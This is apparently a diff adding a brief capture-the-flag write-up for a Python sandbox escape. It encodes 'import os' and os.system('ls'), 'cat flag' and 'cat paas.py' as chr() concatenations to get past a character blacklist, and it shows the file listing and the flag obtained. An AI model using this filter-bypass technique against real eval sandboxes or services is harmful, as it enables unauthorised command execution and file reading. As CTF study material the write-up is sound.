@@ -1,0 +1,25 @@
+sandbox escape 
+special case(not ban import, os, etc...)
+it's ban [ ' , " , = , [ , ] , (space) ]
+so....
+
+# import os
+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)
+>None
+
+# os.system('ls')
+chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(108)+chr(115)+chr(39)+chr(41)
+>flag
+>paas.py
+>None
+
+# os.system('cat flag')
+chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41)
+>flag{vuln3r4b1l17y_45_4_53rv1c3}
+>None
+
+os.system('cat paas.py')
+chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(112)+chr(97)+chr(97)+chr(115)+chr(46)+chr(112)+chr(121)+chr(39)+chr(41)
+
+exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115))
+exec(chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(108)+chr(115)+chr(39)+chr(41))
